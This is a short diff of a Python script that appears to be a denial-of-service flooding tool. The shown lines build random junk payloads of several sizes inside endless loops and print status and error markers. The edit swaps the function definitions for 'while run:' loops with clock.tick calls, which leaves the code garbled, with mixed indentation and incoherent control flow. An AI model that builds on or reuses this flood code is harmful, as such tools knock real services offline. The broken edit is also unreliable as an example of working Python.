@@ -94,7 +94,9 @@ def run():
 		except:
 			print("[!] Error!!!")
 
-def run2():
+while run:
+
+    clock.tick(2)
 	 data = random._urandom(20000)
          i = random.choice(("[+]"))
          while True:
@@ -108,7 +110,15 @@ def run2():
 		 except:
 			print("[!] Error!!!")
 
-def run3():
+
+
+    
+
+
+
+while run:
+
+    clock.tick(3)
 	data = random._urandom(999)
 	i = random.choice(("[+]"))
 	while True:
@@ -124,7 +134,9 @@ def run3():
 			print("[*] Error!!!")
             
 
-def run4():
+while run:
+
+    clock.tick(4)
 	data = random._urandom(818)
 	i = random.choice(("[+]"))
 	while True:
@@ -140,7 +152,9 @@ def run4():
 			print("[-] Error!!!")
             
   
-def run5():
+while run:
+
+    clock.tick(5)
 	data = random._urandom(16)
 	i = random.choice(("[+]"))
 	while True:
